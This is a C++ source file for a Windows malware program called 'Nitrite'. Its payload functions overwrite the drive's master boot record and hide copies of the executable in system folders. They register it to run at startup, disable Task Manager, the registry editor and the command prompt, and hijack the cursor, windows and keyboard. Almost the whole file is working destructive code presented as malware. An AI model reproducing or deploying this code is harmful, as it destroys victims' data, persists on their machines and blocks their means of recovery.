#include <windows.h>
#include "System.h"
#include "Buffer.h"

LPCWSTR GetDir(void) {
	WCHAR dir[MAX_PATH];
	GetModuleFileNameW(NULL, (WCHAR*)dir, MAX_PATH);
	return (LPCWSTR)dir;
}

int psignx = 1, psigny = 1, psignxcopy = 1, psignycopy = 1;
int pincrement = 5;
int px = 10, py = 10;
int pw = GetSystemMetrics(SM_CXSCREEN), ph = GetSystemMetrics(SM_CYSCREEN);

namespace Payloads {
	void OverwriteBootSectors(void) {
		// MBR OVERWRITER //
		DWORD dwWriteBytes;
		HANDLE hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			MessageBoxW(NULL, L"Critical Error!\nException occurred in line 10: Could not overwrite boot sector", L"Nitrite", MB_ICONERROR);
			exit(0);
		}
		WriteFile(hFile, rawData, 32768, &dwWriteBytes, NULL); // Destroy the first 64 sectors of the drive
		CloseHandle(hFile);
	}
	
	
	void InfectSystem(void) {
		// LEAVE THE MALWARE DORMANT IN THE SYSTEM //
		LPCWSTR paths[] = {
			L"C:\\WINDOWS\\System32\\Nitrite.exe",
			L"C:\\Program Files\\Internet Explorer\\Connection Wizard\\Server.exe",
			L"C:\\WINDOWS\\temp.dat",
			L"C:\\WINDOWS\\System32\\oobe\\msoobd.exe"
		};
		int nPaths = _countof(paths);
		for (int t = 0; t < nPaths; t++) {
			System::CopyFileExtW(GetDir(), paths[t], FILE_ATTRIBUTE_HIDDEN);
			System::ManageRegW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"Nitrite Self-Execute Host", 0, 0, (LPBYTE)paths[0], false, true);
		}
	}
	
	void CorruptRegistry(void) {
		// DISABLE SYSTEM TOOLS //
		LPCWSTR syst = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM";
		LPCWSTR cmd = L"SOFTWARE\\POLICIES\\Microsoft\\Windows\\SYSTEM";
		System::ManageRegW(HKEY_CURRENT_USER, syst, L"DisableTaskMgr", REG_DWORD, 1, NULL, false, false);
		System::ManageRegW(HKEY_CURRENT_USER, syst, L"DisableRegistryTools", REG_DWORD, 1, NULL, false, false);
		System::ManageRegW(HKEY_CURRENT_USER, cmd, L"DisableCmd", REG_DWORD, 1, NULL, false, false);
	}
	
	DWORD WINAPI SetStrings(LPVOID pvoid) {
		// CHANGE LABELS TO "NITRITE" //
		while (true) {
			HWND hwnd = GetDesktopWindow();
			EnumChildWindows(hwnd, &System::EnumStrProc, 0);
			Sleep(10);
		}
	}
	
	DWORD WINAPI MoveCursor(LPVOID pvoid) {
		// SET RANDOM CURSOR POSITION //
		while (true) {
			SetCursorPos(rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN));
			Sleep(10);
		}
	}
	
	DWORD WINAPI MoveWindows(LPVOID pvoid) {
		// MOVE ALL ACTIVE WINDOWS //
		while (true) {
			px += pincrement * psignx;
			py += pincrement * psigny;
			HWND hwnd = GetForegroundWindow();
			SetWindowPos(hwnd, NULL, px, py, px, py, SWP_NOSIZE);
			if (px > pw) psignx = -1;
			if (py > ph) psigny = -1;
			if (px == 0) psignx = 1;
			if (py == 0) psigny = 1;
			Sleep(10);
		}
	}
	
	DWORD WINAPI Inputs(LPVOID pvoid) {
		// TYPE A RANDOM KEY EVERY 0.5 SECONDS //
		while (true) {
			SendKeyboardInput(VkKeyScanW(rand() % System::nInput), 0, 500);
		}
	}
}

int EndPayload(HANDLE hPayload) {
	TerminateThread(hPayload, 0);
	CloseHandle(hPayload);
}

int Redraw(void) {
	RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE|RDW_ERASE|RDW_ALLCHILDREN);
}
